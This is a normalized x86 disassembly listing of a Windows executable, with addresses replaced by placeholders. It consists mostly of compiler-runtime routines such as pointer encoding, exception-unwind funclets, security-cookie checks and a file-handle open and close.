push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_4170f4
xor eax eax
inc eax
retn
sub_417108
push 0x8
push r--data
call sub_411bb0
call sub_41686e
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_411fdc
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_417128
xor eax eax
inc eax
retn
sub_41713c
call sub_41686e
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_417108
call eax
sub_41714f
push sub_417108
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_417160
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41716d
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_41717a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_417311
test ebx ebx
je r-xdata
retn
push 0x0
call sub_416f54
pop ecx
sub_4173e0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_413dc0
sub_4173f6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_413dc0
sub_41744d
push sub_41740c
call sub_415ba8
pop ecx
xor eax eax
retn
sub_4178d1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_417b0c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_417b15
mov esp [ ebp - 0x18 ]
call sub_417108
sub_417b37
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41027b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_417b52
mov [ ecx ] r--data
jmp sub_41029e
sub_417c17
push [ ebp - 0x14 ]
call sub_417e0b
pop ecx
retn
sub_417d50
push 0x4
mov eax sub_41dabf
call sub_4113e1
call sub_41686e
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41713c
call sub_4170d0
sub_418439
xor eax eax
inc eax
retn
sub_41843d
mov esp [ ebp - 0x18 ]
call sub_417108
sub_4185b7
xor eax eax
inc eax
retn
sub_4185bb
mov esp [ ebp - 0x18 ]
call sub_417108
sub_41869a
push [ ebp - 0x14 ]
call sub_4185cb
pop ecx
retn
sub_4186d8
call sub_41686e
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_41686e
dec [ eax + 0x90 ]
sub_418953
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_41996e
mov ecx [ rw-data ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
retn
sub_419bfb
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419b08
add esp 0x10
pop ebp
retn
sub_419f78
push 0x1
call sub_416f54
pop ecx
retn
sub_41a82a
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41a012
add esp 0x18
pop ebp
retn
sub_41ab19
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_41aa50
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_41ab64
call eax
retn
sub_41abea
push 0xa
call sub_416f54
pop ecx
retn
sub_41acc7
push 0xa
call sub_416f54
pop ecx
retn
sub_41ad8f
push 0xb
call sub_416f54
pop ecx
retn
sub_41aff2
push edi
call sub_41af07
pop ecx
retn
sub_41b22f
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41b11c
add esp 0x18
pop ebp
retn
sub_41b24d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b265
add esp 0x10
pop ebp
retn
sub_41b37a
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b392
add esp 0x10
pop ebp
retn
sub_41d2d3
push 0x2
call sub_4107c1
sub_41d2dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_41d40d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d2eb
add esp 0x14
pop ebp
retn
sub_41d833
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_41d84a
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_41dabf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dada
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_40223f
sub_41daf3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41db0e
lea ecx [ ebp - 0xe8 ]
jmp sub_40211d
sub_41db19
lea ecx [ ebp - 0x148 ]
jmp sub_40211d
sub_41db24
lea ecx [ ebp - 0x118 ]
jmp sub_40211d
sub_41db2f
lea ecx [ ebp - 0x178 ]
jmp sub_40211d
sub_41db3a
lea ecx [ ebp - 0x40 ]
jmp sub_40211d
sub_41db42
lea ecx [ ebp - 0xa0 ]
jmp sub_40211d
sub_41db4d
lea ecx [ ebp - 0x190 ]
jmp sub_40211d
sub_41db58
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x194 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41db76
lea ecx [ ebp + 0x4 ]
jmp sub_40223f
sub_41db7e
mov eax [ ebp - 0x50 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x50 ] 0xfffffffe
mov ecx [ ebp - 0x44 ]
jmp sub_40223f
sub_41db97
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41db9f
mov eax [ ebp - 0x50 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x50 ] 0xfffffffd
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41dbb8
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41dbc0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dbe8
lea ecx [ ebp + 0x8 ]
jmp sub_40223f
sub_41dbf0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dc0b
lea ecx [ ebp - 0xc8 ]
jmp sub_40223f
sub_41dc16
lea ecx [ ebp - 0x158 ]
jmp sub_40223f
sub_41dc21
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dc2c
lea ecx [ ebp - 0x140 ]
jmp sub_40211d
sub_41dc37
lea ecx [ ebp - 0x140 ]
jmp sub_40211d
sub_41dc42
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dc4d
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dc58
lea ecx [ ebp - 0x128 ]
jmp sub_40223f
sub_41dc63
push [ ebp - 0x164 ]
call j_sub_40f402#2
pop ecx
retn
sub_41dc70
mov ecx [ ebp - 0x15c ]
jmp sub_40223f
sub_41dc7b
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dc86
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dc91
lea ecx [ ebp - 0xb0 ]
jmp sub_40bcf5
sub_41dc9c
lea ecx [ ebp - 0xf8 ]
jmp sub_40223f
sub_41dca7
lea ecx [ ebp - 0xe0 ]
jmp sub_40223f
sub_41dcb2
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dcbd
lea ecx [ ebp - 0x110 ]
jmp sub_40223f
sub_41dcc8
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dcd3
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dcde
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dce9
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dcf4
lea ecx [ ebp - 0x17c ]
jmp sub_40211d
sub_41dcff
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x184 ]
mov ecx [ edx - 0x188 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dd2d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dd48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dd63
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_40211d
sub_41dd7c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dd97
lea ecx [ ebp + 0x4 ]
jmp sub_40223f
sub_41dd9f
lea ecx [ ebp - 0x258 ]
jmp sub_40223f
sub_41ddaa
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x27c ]
mov ecx [ edx - 0x280 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41ddd8
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41dde0
lea ecx [ ebp - 0x28 ]
jmp sub_40211d
sub_41dde8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1b4 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41de10
lea ecx [ ebp - 0x440 ]
jmp sub_40223f
sub_41de1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x444 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41de43
lea ecx [ ebp + 0x8 ]
jmp sub_40211d
sub_41de4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x27c ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41de73
lea ecx [ ebp + 0x8 ]
jmp sub_40223f
sub_41de7b
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41de83
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2ac ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41deab
lea ecx [ ebp - 0x234 ]
jmp sub_40223f
sub_41deb6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x23c ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dede
lea ecx [ ebp - 0x2c ]
jmp sub_40223f
sub_41dee6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x38 ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41df0e
lea ecx [ ebp - 0x2c ]
jmp sub_40211d
sub_41df16
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x38 ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41df3e
lea ecx [ ebp - 0x6a4 ]
jmp sub_40211d
sub_41df49
lea ecx [ ebp - 0x448 ]
jmp sub_40211d
sub_41df54
lea ecx [ ebp - 0x6c4 ]
jmp sub_40211d
sub_41df5f
lea ecx [ ebp - 0x68c ]
jmp sub_40211d
sub_41df6a
lea ecx [ ebp - 0x6c4 ]
jmp sub_40211d
sub_41df75
lea ecx [ ebp - 0x448 ]
jmp sub_40211d
sub_41df80
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6cc ]
mov ecx [ edx - 0x6d0 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dfae
lea ecx [ ebp - 0x28 ]
jmp sub_40211d
sub_41dfb6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41dfde
lea ecx [ ebp + 0x20 ]
jmp sub_40223f
sub_41dfe6
lea ecx [ ebp + 0x8 ]
jmp sub_40223f
sub_41dfee
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40223f
sub_41dff9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e014
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx + 0x824 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e03c
lea ecx [ ebp - 0x50 ]
jmp sub_40adb2
sub_41e044
lea ecx [ ebp - 0x54 ]
jmp sub_40adb2
sub_41e04c
lea ecx [ ebp - 0x58 ]
jmp sub_40adb2
sub_41e054
lea ecx [ ebp - 0x5c ]
jmp sub_40adb2
sub_41e05c
lea ecx [ ebp - 0x60 ]
jmp sub_40adb2
sub_41e064
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx + 0x434 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e08f
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_40223f
sub_41e09a
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_40223f
sub_41e0a5
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_40223f
sub_41e0b0
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp j_sub_40e057
sub_41e0bb
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp j_sub_40e057
sub_41e0c6
mov ecx [ ebp - 0x10 ]
add ecx 0x68
jmp j_sub_40e057
sub_41e0d1
mov ecx [ ebp - 0x10 ]
add ecx 0x74
jmp j_sub_40e057
sub_41e0dc
mov ecx [ ebp - 0x10 ]
add ecx 0x84
jmp sub_40223f
sub_41e0ea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e105
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41e10d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e128
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41e130
lea ecx [ ebp - 0x58 ]
jmp sub_40223f
sub_41e138
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41e140
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e168
lea ecx [ ebp + 0x8 ]
jmp sub_40223f
sub_41e170
lea ecx [ ebp - 0x7c ]
jmp j_sub_40e891
sub_41e178
lea ecx [ ebp - 0x44 ]
jmp sub_40223f
sub_41e180
lea ecx [ ebp - 0x94 ]
jmp sub_40223f
sub_41e18b
lea ecx [ ebp - 0x5c ]
jmp sub_40223f
sub_41e193
lea ecx [ ebp - 0x2c ]
jmp sub_40223f
sub_41e19b
lea ecx [ ebp - 0x74 ]
jmp sub_40223f
sub_41e1a3
lea ecx [ ebp - 0x5c ]
jmp sub_40223f
sub_41e1ab
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x98 ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e1d9
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41e1e1
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41e1e9
lea ecx [ ebp - 0x2c0 ]
jmp sub_40223f
sub_41e1f4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2dc ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e21c
lea ecx [ ebp - 0xa98 ]
jmp sub_40223f
sub_41e227
lea ecx [ ebp - 0xa98 ]
jmp sub_40223f
sub_41e232
lea ecx [ ebp - 0xab0 ]
jmp sub_40223f
sub_41e23d
lea ecx [ ebp - 0xa98 ]
jmp sub_40223f
sub_41e248
lea ecx [ ebp - 0xae4 ]
jmp sub_40223f
sub_41e253
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xaf4 ]
mov ecx [ edx - 0xaf8 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e281
lea ecx [ ebp - 0x2c ]
jmp sub_40223f
sub_41e289
lea ecx [ ebp - 0x44 ]
jmp sub_40223f
sub_41e291
lea ecx [ ebp - 0x2c8 ]
jmp sub_40223f
sub_41e29c
lea ecx [ ebp - 0x2e0 ]
jmp sub_40223f
sub_41e2a7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2fc ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e2cf
lea ecx [ ebp - 0x484 ]
jmp sub_40223f
sub_41e2da
lea ecx [ ebp - 0x454 ]
jmp sub_40223f
sub_41e2e5
lea ecx [ ebp - 0x43c ]
jmp sub_40223f
sub_41e2f0
lea ecx [ ebp - 0x46c ]
jmp sub_40223f
sub_41e2fb
lea ecx [ ebp - 0x49c ]
jmp sub_40223f
sub_41e306
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4ac ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e32e
lea ecx [ ebp - 0x70 ]
jmp sub_40223f
sub_41e336
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41e33e
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41e346
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e36b
lea ecx [ ebp - 0x44 ]
jmp sub_40223f
sub_41e373
lea ecx [ ebp - 0x2c ]
jmp sub_40223f
sub_41e37b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e3a0
lea ecx [ ebp - 0x230 ]
jmp sub_40223f
sub_41e3ab
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x244 ]
mov ecx [ edx - 0x248 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e3d9
lea ecx [ ebp - 0x2c ]
jmp sub_40223f
sub_41e3e1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_40eb9e
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e409
mov eax [ ebp - 0x13c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x13c ] 0xfffffffe
mov ecx [ ebp - 0x138 ]
jmp sub_40223f
sub_41e42b
lea ecx [ ebp - 0x134 ]
jmp sub_40223f
sub_41e436
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x144 ]
mov ecx [ edx - 0x148 ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e464
lea ecx [ ebp - 0x18 ]
jmp j_sub_40e891
sub_41e46c
lea ecx [ ebp - 0x30 ]
jmp sub_40223f
sub_41e474
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e499
lea ecx [ ebp - 0x230 ]
jmp sub_40223f
sub_41e4a4
lea ecx [ ebp - 0x238 ]
jmp j_sub_40e891
sub_41e4af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x254 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e4d7
lea ecx [ ebp - 0x30 ]
jmp sub_40223f
sub_41e4df
lea ecx [ ebp - 0x18 ]
jmp j_sub_40e891
sub_41e4e7
lea ecx [ ebp - 0x48 ]
jmp sub_40223f
sub_41e4ef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e514
lea ecx [ ebp - 0x190 ]
jmp j_sub_40e057
sub_41e51f
lea ecx [ ebp - 0x134 ]
jmp sub_40211d
sub_41e52a
lea ecx [ ebp - 0x14c ]
jmp sub_40223f
sub_41e535
lea ecx [ ebp - 0x17c ]
jmp sub_40223f
sub_41e540
lea ecx [ ebp - 0x164 ]
jmp sub_40223f
sub_41e54b
lea ecx [ ebp - 0x14c ]
jmp sub_40223f
sub_41e556
lea ecx [ ebp - 0x14c ]
jmp sub_40223f
sub_41e561
lea ecx [ ebp - 0x14c ]
jmp sub_40223f
sub_41e56c
lea ecx [ ebp - 0x14c ]
jmp sub_40223f
sub_41e577
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x198 ]
mov ecx [ edx - 0x19c ]
xor ecx eax
call sub_40eb9e
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e5a5
lea ecx [ ebp - 0x238 ]
jmp sub_40223f
sub_41e5b0
lea ecx [ ebp - 0x2c8 ]
jmp sub_40223f
sub_41e5bb
lea ecx [ ebp - 0x2b0 ]
jmp sub_40223f
sub_41e5c6
lea ecx [ ebp - 0x298 ]
jmp sub_40223f
sub_41e5d1
lea ecx [ ebp - 0x280 ]
jmp sub_40223f
sub_41e5dc
lea ecx [ ebp - 0x250 ]
jmp sub_40223f
sub_41e5e7
lea ecx [ ebp - 0x268 ]
jmp sub_40223f
sub_41e5f2
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2d4 ]
mov ecx [ edx - 0x2d8 ]
xor ecx eax
call sub_40eb9e
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e620
lea ecx [ ebp + 0xc ]
jmp sub_40223f
sub_41e628
lea ecx [ ebp - 0x40 ]
jmp sub_40223f
sub_41e630
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41e638
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e65d
lea ecx [ ebp + 0xc ]
jmp sub_40223f
sub_41e665
lea ecx [ ebp - 0x88c ]
jmp sub_40211d
sub_41e670
lea ecx [ ebp - 0x8a4 ]
jmp sub_40223f
sub_41e67b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x938 ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e6a3
lea ecx [ ebp - 0x28 ]
jmp sub_40223f
sub_41e6ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_40eb9e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40eb9e
mov eax r--data
jmp sub_4117fd
sub_41e6d0
mov ecx rw-data
call sub_4011db
push sub_41e7c6
call sub_40f3c3
pop ecx
retn
sub_41e6e6
mov ecx rw-data
call sub_40123f
push sub_41e7bc
call sub_40f3c3
pop ecx
retn
sub_41e6fc
mov ecx rw-data
call sub_4012a7
push sub_41e7b2
call sub_40f3c3
pop ecx
retn
sub_41e712
push 0x0
mov ecx rw-data
call sub_4010d7
retn
sub_41e71f
push 0x0
mov ecx rw-data
call sub_4010d7
retn
sub_41e72c
push 0x0
mov ecx rw-data
call sub_4010d7
retn
sub_41e739
push 0x0
mov ecx rw-data
call sub_4010d7
retn
sub_41e746
push r--data
mov ecx rw-data
call sub_402193
push sub_41e7da
call sub_40f3c3
pop ecx
retn
sub_41e761
push r--data
mov ecx rw-data
call sub_402193
push sub_41e7e4
call sub_40f3c3
pop ecx
retn
sub_41e77c
push r--data
mov ecx rw-data
call sub_402193
push sub_41e7ee
call sub_40f3c3
pop ecx
retn
sub_41e797
push r--data
mov ecx rw-data
call sub_402193
push sub_41e7f8
call sub_40f3c3
pop ecx
retn
sub_41e7b2
mov ecx rw-data
jmp j_sub_4010eb
sub_41e7bc
mov ecx rw-data
jmp j_sub_4010eb
sub_41e7c6
mov ecx rw-data
jmp j_sub_4010eb#2
sub_41e7d0
mov ecx rw-data
jmp sub_40223f
sub_41e7da
mov ecx rw-data
jmp sub_40223f
sub_41e7e4
mov ecx rw-data
jmp sub_40223f
sub_41e7ee
mov ecx rw-data
jmp sub_40223f
sub_41e7f8
mov ecx rw-data
jmp sub_40223f
sub_41e802
mov ecx rw-data
jmp sub_40223f
